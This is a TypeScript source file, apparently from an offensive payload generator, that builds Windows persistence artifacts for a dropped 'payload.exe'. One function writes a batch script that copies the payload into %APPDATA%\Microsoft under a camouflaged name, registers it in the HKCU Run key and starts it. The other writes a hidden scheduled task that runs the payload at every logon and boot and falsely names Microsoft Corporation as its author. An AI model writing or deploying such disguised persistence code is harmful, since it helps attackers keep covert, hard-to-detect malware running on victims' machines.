import type { PayloadConfig } from "@/lib/payloads/generator"

export function generateWindowsRegistryBat(config: PayloadConfig): string {
  const binaryName = config.camouflage?.enabled && config.camouflage.binaryName
    ? config.camouflage.binaryName
    : `${config.name}.exe`
  const svcName = config.persistence.serviceName

  return `@echo off
setlocal

set "TARGET=%APPDATA%\\Microsoft\\${binaryName}"

xcopy /Y "%~dp0payload.exe" "%TARGET%" >nul 2>&1
if %ERRORLEVEL% neq 0 (
  copy /Y "%~dp0payload.exe" "%TARGET%"
)

reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" ^
  /v "${svcName}" ^
  /t REG_SZ ^
  /d "%TARGET%" /f >nul

echo Installed ${svcName} persistence
start "" "%TARGET%"
`
}

export function generateWindowsScheduledTaskXml(config: PayloadConfig): string {
  const binaryName = config.camouflage?.enabled && config.camouflage.binaryName
    ? config.camouflage.binaryName
    : `${config.name}.exe`
  const svcName = config.persistence.serviceName
  const svcDesc = config.persistence.serviceDescription

  return `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>${svcDesc}</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Hidden>true</Hidden>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions>
    <Exec>
      <Command>%APPDATA%\\Microsoft\\${binaryName}</Command>
    </Exec>
  </Actions>
</Task>
`
}
